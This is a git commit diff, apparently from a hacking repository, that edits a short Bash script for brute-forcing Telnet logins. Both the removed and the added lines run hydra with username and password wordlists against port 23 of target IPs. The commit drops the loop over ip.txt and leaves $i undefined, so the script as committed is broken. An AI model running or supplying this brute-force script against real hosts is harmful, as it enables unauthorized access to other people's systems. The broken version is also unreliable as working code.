45e533cad79a20d4d2583723dd9080b61545367a
hackingyseguridad <antonio_taboada@hotmail.es>
2022-05-20 13:08:17 +0200

    Update brutetelnet.sh

--- brutetelnet.sh
+++ brutetelnet.sh
@@ -1,8 +1,5 @@
 #!/bin/bash
 # Fuerza bruta Telnet
 
-for i in `cat ip.txt`
-do
-        echo $i
-        hydra -L usuarios.txt -P claves.txt telnet://$i:23
-done
+echo $i
+hydra -L usuarios.txt -P claves.txt telnet://$i:23
